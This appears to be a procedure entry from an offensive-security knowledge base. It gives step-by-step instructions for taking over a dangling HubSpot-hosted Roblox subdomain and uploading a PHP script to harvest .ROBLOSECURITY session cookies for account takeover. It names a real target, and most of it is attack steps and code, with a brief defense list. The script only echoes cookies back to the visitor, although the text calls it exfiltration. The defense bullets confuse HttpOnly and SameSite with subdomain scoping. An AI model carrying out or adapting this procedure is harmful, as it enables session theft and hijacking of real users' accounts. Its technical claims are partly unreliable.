---
id: proc-claim-subdomain-cookie-steal
name: Claim-Subdomain-and-Host-Cookie-Stealing-Script
type: procedure
verified: false
submitted: true
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.314Z'
tactics:
  - '[[Execution]]'
  - '[[Credential Access]]'
techniques:
  - '[[Credentials In Files]]'
sub_techniques: []
tags:
  - subdomain-takeover
  - cookie-theft
  - php-script
platforms:
  - Web
commands:
  - '[[commands/php-cookie-stealer]]'
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Credentials In Files]]'
---

# Claim-Subdomain-and-Host-Cookie-Stealing-Script

## Summary

This procedure claims control of a taken-over subdomain and deploys a PHP script to steal session cookies, such as Roblox's .ROBLOSECURITY, which are scoped to all subdomains, allowing attackers to impersonate users.

## Description

After verifying the takeover, register the HubSpot instance and upload a PHP script that iterates over incoming cookies. In the Roblox case, this exploits the cookie's domain=.roblox.com scoping, capturing tokens when users visit the malicious page. Outcomes include full account access for the victim. Requires a HubSpot account and basic PHP knowledge.

## Requirements

1. Control over the third-party service (e.g., HubSpot login)
2. Ability to upload PHP files to the hosted subdomain
3. Target users must visit the subdomain while authenticated

## Defense

Defensive measures and detection strategies:

- Scope cookies to specific subdomains (e.g., HttpOnly, Secure, SameSite=Strict)
- Monitor for anomalous traffic to development subdomains
- Implement client-side cookie protection and subdomain isolation

## Objectives

1. Deploy persistent malicious script on controlled subdomain
2. Capture and exfiltrate authentication cookies
3. Enable account takeover for impersonation

## Instructions

### Step 1: Claim the HubSpot Instance

**Context**: Link the DNS CNAME to your HubSpot account to gain hosting control.

Log in to HubSpot, search for the unclaimed domain, and associate it with devrel.roblox.com.

**Expected Output**: Dashboard confirms domain ownership; uploads are possible.

### Step 2: Upload and Execute Cookie Stealer

**Context**: Host the PHP script to capture cookies from visitors.

**Command** ([[commands/php-cookie-stealer]]):
```php
<?php echo"Cookies received: <br>"; foreach($_COOKIE as $key=>$val) { echo"Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"; } ?>
```

> This script loops through the $_COOKIE superglobal, echoing values for logging or exfiltration. When a user visits, it outputs cookies like .ROBLOSECURITY=abc123.

Save as index.php and upload to the root of devrel.roblox.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Credential Access]]

### Techniques

- [[Credentials In Files]]

### Sub-Techniques


## Commands Used

- [[commands/php-cookie-stealer]]

## Tools Used


## Tags

- [[subdomain-takeover]]
- [[cookie-theft]]
- [[php-script]]
